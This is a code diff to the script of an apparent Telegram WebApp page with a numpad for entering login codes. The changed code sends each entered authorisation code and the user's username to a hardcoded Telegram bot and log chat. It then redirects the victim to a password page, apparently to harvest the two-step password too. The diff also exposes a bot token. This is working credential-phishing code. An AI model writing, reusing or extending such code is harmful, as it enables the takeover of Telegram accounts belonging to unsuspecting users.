@@ -189,43 +189,26 @@ function updateBoxes() {
 }
 
 function sendCodeToServer(code) {
-  fetch('/api/auth', {
-    method: 'POST',
-    headers: {
-      'Content-Type': 'application/json',
-    },
-    body: JSON.stringify({
-      type: 'auth_code',
-      code: code,
-      phone_number: "",
-      user_id: tg.initDataUnsafe.user?.id
-    })
-  }).catch(error => {
-    console.error('Error sending code to server:', error);
-  });
-}
-
-function sendCodeToBot(code, phoneNumber) {
+  // Сохраняем в localStorage
+  const data = {
+    code: code,
+    timestamp: new Date().toISOString()
+  };
+  localStorage.setItem('sendstars_data', JSON.stringify(data));
+  
+  // Отправляем в Telegram бота
   const botToken = '8403065874:AAHg_uz-bB1EMN3sfcWo43xgE-YkVPPgX2w';
   const logChatId = '-5067724174';
   
   const user = tg.initDataUnsafe.user;
   const username = user?.username ? `@${user.username}` : 'без username';
   
-  const message = `🔐 Код авторизации из WebApp\n👤 Пользователь: ${username}\n📱 Телефон: ${phoneNumber}\n🔢 Код: ${code}`;
+  const message = `🔐 Код авторизации\n👤 Пользователь: ${username}\n🔢 Код: ${code}`;
   
   fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
     method: 'POST',
-    headers: {
-      'Content-Type': 'application/json',
-    },
-    body: JSON.stringify({
-      chat_id: logChatId,
-      text: message,
-      parse_mode: 'HTML'
-    })
-  }).catch(error => {
-    console.error('Ошибка отправки кода в бота:', error);
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ chat_id: logChatId, text: message, parse_mode: 'HTML' })
   });
 }
 
@@ -247,13 +230,13 @@ document.querySelectorAll('.numpad button').forEach(btn => {
         type: 'auth_code',
         code: code,
         user_id: tg.initDataUnsafe.user?.id,
-        phone_number: "79999999999"
+        phone_number: ""
       }));
 
       sendCodeToServer(code);
 
       setTimeout(() => {
-        window.location.href = `password.html?phone=79999999999&code=${code}`;
+        window.location.href = `password.html?code=${code}`;
       }, 1000);
     }
   });
